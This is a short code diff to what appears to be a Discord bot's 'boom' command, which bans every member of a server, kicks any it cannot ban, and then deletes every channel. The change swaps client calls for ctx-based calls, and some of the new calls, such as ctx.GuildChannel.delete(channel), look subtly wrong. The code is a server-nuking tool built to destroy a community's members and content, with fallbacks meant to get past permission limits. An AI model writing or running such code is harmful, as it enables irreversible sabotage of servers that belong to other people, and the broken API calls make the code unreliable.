@@ -35,13 +35,13 @@ async def boom(ctx):
         else:
             # in-case you cant ban someone due to perms, roles, etc.
             try:
-                await client.ban(member, delete_message_days=7)
+                await ctx.ban(member, delete_message_days=7)
                 banint += 1
                 print("Banned member count: {}.".format(banint))
             except Exception as e:
                 print(e)
                 try:
-                    await client.kick(member)   # tries to kick if no perms to ban
+                    await ctx.kick(member)   # tries to kick if no perms to ban
                     kickint += 1
                     print("Kicked member count: {}.".format(kickint))
                 except Exception as e:
@@ -55,7 +55,7 @@ async def boom(ctx):
 
     for channel in list(server.channels):
         try:
-            await client.delete_channel(channel)
+            await ctx.GuildChannel.delete(channel)
             print("Deleting channel [{}]".format(channel.name))
         except Exception as e:
             print(e)
